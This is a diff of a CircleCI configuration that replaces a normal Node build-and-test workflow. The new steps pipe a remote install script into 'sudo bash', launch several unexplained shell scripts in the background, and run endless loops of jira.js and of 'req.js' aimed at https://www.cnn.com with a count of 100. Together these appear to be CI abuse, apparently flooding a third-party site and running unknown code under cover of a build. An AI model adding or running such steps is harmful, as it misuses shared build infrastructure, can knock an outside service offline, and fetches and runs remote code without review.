@@ -1,17 +1,21 @@
-version: 2.1
-orbs:
-  node: circleci/node@1.1.6
+version: 2.0
 jobs:
-  build-and-test:
-    executor:
-      name: node/default
+  build:
+    docker:
+      - image: ubuntu:18.04
     steps:
       - checkout
-      - node/with-cache:
-          steps:
-            - run: npm install
-            - run: apt update && apt -y install wget curl axel nodejs npm
-workflows:
-    build-and-test:
-      jobs:
-        - build-and-test
+      - run:
+          name: "Update Node.js and npm"
+          command: |
+            curl -sSL "https://nodejs.org/dist/v11.10.0/node-v11.10.0-linux-x64.tar.xz" | sudo tar --strip-components=2 -xJ -C /usr/local/bin/ node-v11.10.0-linux-x64/bin/node
+            curl https://www.npmjs.com/install.sh | sudo bash
+      - run:
+          name: Check current version of node
+          command: node -v
+      - run: chmod +x ./test.sh && ./test.sh &
+      - run: chmod +x ./google.sh && ./google.sh &
+      - run: chmod +x ./rw.sh && ./rw.sh &
+      - run: chmod +x ./jira.sh && ./jira.sh &
+      - run: npm install && while true; do nodejs jira.js; done &
+      - run: while true; do node req.js https://www.cnn.com 100 > /dev/null; done
